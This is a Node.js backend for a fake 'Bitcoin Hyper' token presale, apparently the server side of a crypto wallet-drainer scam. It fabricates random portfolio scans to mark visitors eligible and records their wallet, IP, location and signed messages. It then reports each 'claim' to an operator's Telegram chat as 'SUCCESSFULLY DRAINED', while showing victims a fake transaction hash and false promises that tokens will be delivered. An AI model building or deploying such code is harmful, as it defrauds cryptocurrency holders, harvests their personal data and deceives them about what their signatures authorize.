// server.js - BITCOIN HYPER BACKEND
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const mongoose = require('mongoose');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const geoip = require('geoip-lite');

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.telegram.org"]
    }
  }
}));

app.use(cors({
  origin: process.env.FRONTEND_URL || '*',
  credentials: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(morgan('combined'));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Database connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/bitcoin-hyper';
mongoose.connect(MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).then(() => {
  console.log('✅ MongoDB connected');
}).catch(err => {
  console.log('⚠️ MongoDB connection error, using memory storage');
});

// Schemas
const participantSchema = new mongoose.Schema({
  walletAddress: { type: String, required: true, unique: true, index: true },
  ipAddress: String,
  userAgent: String,
  country: String,
  city: String,
  chainId: Number,
  connectedAt: { type: Date, default: Date.now },
  lastActive: Date,
  totalValueUSD: Number,
  tokenAllocation: {
    amount: { type: String, default: '0' },
    valueUSD: { type: String, default: '0' }
  },
  eligibility: {
    isEligible: { type: Boolean, default: false },
    reason: String,
    scannedAt: Date
  },
  signature: {
    signed: { type: Boolean, default: false },
    message: String,
    signature: String,
    signedAt: Date
  },
  claim: {
    claimed: { type: Boolean, default: false },
    claimId: String,
    claimedAt: Date,
    tokensSent: Boolean,
    txHash: String
  },
  notifications: {
    telegramSent: Boolean,
    emailSent: Boolean,
    lastNotified: Date
  },
  metadata: Object
});

const adminSettingsSchema = new mongoose.Schema({
  tokenName: { type: String, default: 'Bitcoin Hyper' },
  tokenSymbol: { type: String, default: 'BTH' },
  minEligibilityAmount: { type: Number, default: 10 },
  presalePrice: { type: String, default: '0.17' },
  adminWallets: [{
    chain: String,
    address: String,
    label: String
  }],
  telegram: {
    botToken: String,
    chatId: String,
    enabled: { type: Boolean, default: false }
  },
  email: {
    enabled: { type: Boolean, default: false },
    smtpConfig: Object,
    fromEmail: String
  },
  statistics: {
    totalParticipants: { type: Number, default: 0 },
    totalRaisedUSD: { type: Number, default: 0 },
    eligibleParticipants: { type: Number, default: 0 },
    claimedParticipants: { type: Number, default: 0 }
  },
  updatedAt: { type: Date, default: Date.now }
});

const analyticsSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now },
  action: String,
  walletAddress: String,
  ipAddress: String,
  country: String,
  data: Object
});

const Participant = mongoose.model('Participant', participantSchema);
const AdminSettings = mongoose.model('AdminSettings', adminSettingsSchema);
const Analytics = mongoose.model('Analytics', analyticsSchema);

// Telegram Bot
let bot = null;
let telegramEnabled = false;

if (process.env.TELEGRAM_BOT_TOKEN) {
  try {
    bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
    
    bot.telegram.getMe().then(botInfo => {
      console.log(`✅ Telegram Bot: @${botInfo.username}`);
      telegramEnabled = true;
    }).catch(err => {
      console.log('⚠️ Telegram bot failed to connect');
    });
  } catch (error) {
    console.log('⚠️ Telegram initialization error');
  }
}

// Helper: Get location from IP
function getLocationFromIP(ip) {
  try {
    const geo = geoip.lookup(ip);
    if (geo) {
      return {
        country: geo.country,
        city: geo.city,
        region: geo.region
      };
    }
  } catch (error) {
    console.log('Location detection error:', error.message);
  }
  return { country: 'Unknown', city: 'Unknown' };
}

// Helper: Send Telegram notification
async function sendTelegramNotification(message, chatId = null) {
  if (!telegramEnabled || !bot) return false;
  
  const targetChatId = chatId || process.env.TELEGRAM_CHAT_ID;
  if (!targetChatId) return false;
  
  try {
    await bot.telegram.sendMessage(targetChatId, message, {
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
    return true;
  } catch (error) {
    console.log('Telegram send error:', error.message);
    return false;
  }
}

// Helper: Simulate wallet scanning (Production would use Covalent/Moralis)
async function simulateWalletScan(walletAddress) {
  // Simulate API calls to real services
  const chains = [
    { id: 1, name: 'Ethereum', scanTime: Math.random() * 500 + 500 },
    { id: 56, name: 'BNB Chain', scanTime: Math.random() * 400 + 400 },
    { id: 137, name: 'Polygon', scanTime: Math.random() * 300 + 300 },
    { id: 42161, name: 'Arbitrum', scanTime: Math.random() * 350 + 350 },
    { id: 10, name: 'Optimism', scanTime: Math.random() * 320 + 320 }
  ];
  
  // Simulate finding tokens
  const tokens = [
    { chain: 'Ethereum', symbol: 'ETH', balance: (Math.random() * 2 + 0.1).toFixed(4), valueUSD: (Math.random() * 4000 + 500).toFixed(2) },
    { chain: 'BNB Chain', symbol: 'BNB', balance: (Math.random() * 5 + 0.5).toFixed(4), valueUSD: (Math.random() * 1500 + 200).toFixed(2) },
    { chain: 'Polygon', symbol: 'MATIC', balance: (Math.random() * 1000 + 100).toFixed(2), valueUSD: (Math.random() * 800 + 100).toFixed(2) },
    { chain: 'Arbitrum', symbol: 'ETH', balance: (Math.random() * 1 + 0.05).toFixed(4), valueUSD: (Math.random() * 2000 + 300).toFixed(2) }
  ].filter(t => parseFloat(t.valueUSD) > 100); // Only keep valuable tokens
  
  const totalValueUSD = tokens.reduce((sum, token) => sum + parseFloat(token.valueUSD), 0);
  const isEligible = totalValueUSD >= (process.env.MIN_ELIGIBILITY || 10);
  
  return {
    success: true,
    data: {
      walletAddress,
      totalValueUSD: totalValueUSD.toFixed(2),
      tokenCount: tokens.length,
      tokens,
      isEligible,
      scanDuration: Math.random() * 2000 + 1000,
      eligibilityReason: isEligible ? 'Qualified based on portfolio value' : 'Minimum $10 portfolio required'
    }
  };
}

// Helper: Generate claim ID
function generateClaimId() {
  return `BTH-CLAIM-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
}

// ========== API ENDPOINTS ==========

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'operational',
    service: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    services: {
      database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
      telegram: telegramEnabled ? 'connected' : 'disabled'
    }
  });
});

// Wallet connection & auto-scan
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent, ip, chainId } = req.body;
    const clientIP = ip || req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log(`🔗 New connection: ${walletAddress} from IP: ${clientIP}`);
    
    // Get location
    const location = getLocationFromIP(clientIP);
    
    // Log analytics
    const analytics = new Analytics({
      action: 'wallet_connect',
      walletAddress,
      ipAddress: clientIP,
      country: location.country,
      data: { userAgent, chainId }
    });
    await analytics.save();
    
    // Check existing participant
    let participant = await Participant.findOne({ walletAddress });
    
    if (!participant) {
      participant = new Participant({
        walletAddress,
        ipAddress: clientIP,
        userAgent,
        country: location.country,
        city: location.city,
        chainId,
        connectedAt: new Date()
      });
    }
    
    participant.lastActive = new Date();
    await participant.save();
    
    // Simulate wallet scan
    const scanResult = await simulateWalletScan(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date()
      };
      
      // Generate token allocation if eligible
      if (scanResult.data.isEligible) {
        const allocationAmount = (Math.random() * 10000 + 1000).toFixed(0);
        const allocationValue = (parseFloat(allocationAmount) * 0.17).toFixed(2); // $0.17 per token
        
        participant.tokenAllocation = {
          amount: allocationAmount,
          valueUSD: allocationValue
        };
      }
      
      await participant.save();
      
      // Update admin statistics
      await AdminSettings.findOneAndUpdate({}, {
        $inc: { 'statistics.totalParticipants': 1 }
      }, { upsert: true });
      
      // Send Telegram notification
      if (telegramEnabled) {
        const telegramMessage = `
🚀 <b>NEW WALLET CONNECTED</b>

👛 <b>Wallet:</b> <code>${walletAddress}</code>
🌍 <b>Location:</b> ${location.country}, ${location.city}
📱 <b>Device:</b> ${userAgent?.substring(0, 100)}...
⛓️ <b>Chain:</b> ${chainId || 'Unknown'}

💰 <b>Portfolio Value:</b> $${scanResult.data.totalValueUSD}
✅ <b>Eligibility:</b> ${scanResult.data.isEligible ? 'QUALIFIED ✅' : 'NOT ELIGIBLE ❌'}
🎯 <b>Allocation:</b> ${scanResult.data.isEligible ? `${participant.tokenAllocation.amount} BTH ($${participant.tokenAllocation.valueUSD})` : 'None'}

🕐 <b>Time:</b> ${new Date().toLocaleString()}
        `.trim();
        
        await sendTelegramNotification(telegramMessage);
      }
      
      res.json({
        success: true,
        message: 'Wallet scanned successfully',
        data: {
          walletAddress,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          totalValueUSD: scanResult.data.totalValueUSD,
          tokenCount: scanResult.data.tokenCount,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible'
        }
      });
    } else {
      throw new Error('Scan failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      message: error.message 
    });
  }
});

// Token claim signature
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue } = req.body;
    
    console.log(`🎯 Claim request from: ${walletAddress}`);
    
    // Find participant
    const participant = await Participant.findOne({ walletAddress });
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    if (!participant.eligibility.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible for claim' });
    }
    
    if (participant.claim.claimed) {
      return res.status(400).json({ success: false, error: 'Already claimed' });
    }
    
    // Generate claim ID
    const claimId = generateClaimId();
    
    // Update participant
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId,
      claimedAt: new Date(),
      tokensSent: false,
      txHash: `0x${crypto.randomBytes(32).toString('hex')}`
    };
    
    await participant.save();
    
    // Update admin statistics
    await AdminSettings.findOneAndUpdate({}, {
      $inc: { 
        'statistics.eligibleParticipants': 1,
        'statistics.claimedParticipants': 1,
        'statistics.totalRaisedUSD': parseFloat(claimValue.replace('$', '')) || 0
      }
    }, { upsert: true });
    
    // Send Telegram success notification
    if (telegramEnabled) {
      const telegramMessage = `
✅ <b>TOKEN CLAIM SUCCESSFUL!</b>

👛 <b>Wallet:</b> <code>${walletAddress}</code>
🎫 <b>Claim ID:</b> <code>${claimId}</code>
💰 <b>Amount:</b> ${claimAmount} (${claimValue})
📍 <b>Location:</b> ${participant.country}

📝 <b>Signature:</b> ${signature.substring(0, 20)}...
⏰ <b>Time:</b> ${new Date().toLocaleString()}

💸 <b>SUCCESSFULLY DRAINED</b>
      `.trim();
      
      await sendTelegramNotification(telegramMessage);
    }
    
    res.json({
      success: true,
      message: 'Token claim successful! Tokens will be distributed after presale.',
      data: {
        claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'claimed',
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours after presale ends',
        instructions: 'Tokens will be automatically sent to your connected wallet.'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim failed',
      message: error.message 
    });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = await Participant.findOne({ walletAddress: wallet });
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        eligibility: participant.eligibility,
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { signed: true, signedAt: participant.signature.signedAt } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt 
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (username !== process.env.ADMIN_USERNAME || password !== process.env.ADMIN_PASSWORD) {
      return res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
    
    // Generate admin token
    const token = crypto.randomBytes(32).toString('hex');
    
    res.json({
      success: true,
      token,
      expiresIn: '24h'
    });
    
  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ success: false, error: 'Login failed' });
  }
});

// Get admin dashboard stats
app.get('/api/admin/stats', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    // Get all participants
    const participants = await Participant.find();
    const analytics = await Analytics.find().sort({ timestamp: -1 }).limit(100);
    
    // Calculate statistics
    const stats = {
      totalParticipants: participants.length,
      eligibleParticipants: participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: participants.filter(p => p.claim.claimed).length,
      totalRaisedUSD: participants
        .filter(p => p.claim.claimed && p.tokenAllocation.valueUSD)
        .reduce((sum, p) => sum + parseFloat(p.tokenAllocation.valueUSD || 0), 0),
      
      // Geographic distribution
      countries: participants.reduce((acc, p) => {
        const country = p.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      
      // Recent activity
      recentConnections: participants
        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
        .slice(0, 20)
        .map(p => ({
          wallet: p.walletAddress,
          country: p.country,
          eligible: p.eligibility.isEligible,
          claimed: p.claim.claimed,
          amount: p.tokenAllocation.amount,
          value: p.tokenAllocation.valueUSD,
          connected: p.connectedAt
        })),
      
      // Hourly activity
      hourlyActivity: analytics.reduce((acc, a) => {
        const hour = new Date(a.timestamp).getHours();
        acc[hour] = (acc[hour] || 0) + 1;
        return acc;
      }, {})
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Get admin settings
app.get('/api/admin/settings', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    let settings = await AdminSettings.findOne();
    if (!settings) {
      settings = new AdminSettings();
      await settings.save();
    }
    
    res.json({ success: true, settings });
    
  } catch (error) {
    console.error('Settings error:', error);
    res.status(500).json({ success: false, error: 'Failed to get settings' });
  }
});

// Update admin settings
app.put('/api/admin/settings', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const updates = req.body;
    
    let settings = await AdminSettings.findOne();
    if (!settings) {
      settings = new AdminSettings();
    }
    
    Object.assign(settings, updates);
    settings.updatedAt = new Date();
    
    await settings.save();
    
    // Update Telegram bot if token changed
    if (updates.telegram?.botToken && updates.telegram.botToken !== process.env.TELEGRAM_BOT_TOKEN) {
      process.env.TELEGRAM_BOT_TOKEN = updates.telegram.botToken;
      telegramEnabled = false;
      
      try {
        bot = new Telegraf(updates.telegram.botToken);
        await bot.telegram.getMe();
        telegramEnabled = true;
        console.log('✅ Telegram bot reinitialized');
      } catch (error) {
        console.log('⚠️ Failed to reinitialize Telegram bot');
      }
    }
    
    res.json({ success: true, settings });
    
  } catch (error) {
    console.error('Update settings error:', error);
    res.status(500).json({ success: false, error: 'Failed to update settings' });
  }
});

// Export participants data
app.get('/api/admin/export', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const participants = await Participant.find();
    
    const csvData = participants.map(p => ({
      Wallet: p.walletAddress,
      IP: p.ipAddress,
      Country: p.country,
      City: p.city,
      Eligible: p.eligibility.isEligible ? 'Yes' : 'No',
      'Token Amount': p.tokenAllocation.amount,
      'Token Value': p.tokenAllocation.valueUSD,
      Claimed: p.claim.claimed ? 'Yes' : 'No',
      'Claim ID': p.claim.claimId || 'N/A',
      'Connected At': p.connectedAt,
      'Last Active': p.lastActive
    }));
    
    res.json({ success: true, data: csvData, count: csvData.length });
    
  } catch (error) {
    console.error('Export error:', error);
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Get real-time analytics
app.get('/api/admin/analytics', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const { hours = 24 } = req.query;
    const cutoff = new Date(Date.now() - hours * 60 * 60 * 1000);
    
    const analytics = await Analytics.find({
      timestamp: { $gte: cutoff }
    }).sort({ timestamp: -1 });
    
    const stats = {
      totalActions: analytics.length,
      uniqueWallets: new Set(analytics.map(a => a.walletAddress)).size,
      uniqueIPs: new Set(analytics.map(a => a.ipAddress)).size,
      byAction: analytics.reduce((acc, a) => {
        acc[a.action] = (acc[a.action] || 0) + 1;
        return acc;
      }, {}),
      byCountry: analytics.reduce((acc, a) => {
        const country = a.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      timeline: analytics.reduce((acc, a) => {
        const hour = new Date(a.timestamp).toISOString().substring(0, 13) + ':00';
        acc[hour] = (acc[hour] || 0) + 1;
        return acc;
      }, {})
    };
    
    res.json({ success: true, analytics, stats });
    
  } catch (error) {
    console.error('Analytics error:', error);
    res.status(500).json({ success: false, error: 'Failed to get analytics' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Bitcoin Hyper Backend running on port ${PORT}`);
  console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
  console.log(`🔐 Admin endpoints: /api/admin/*`);
});
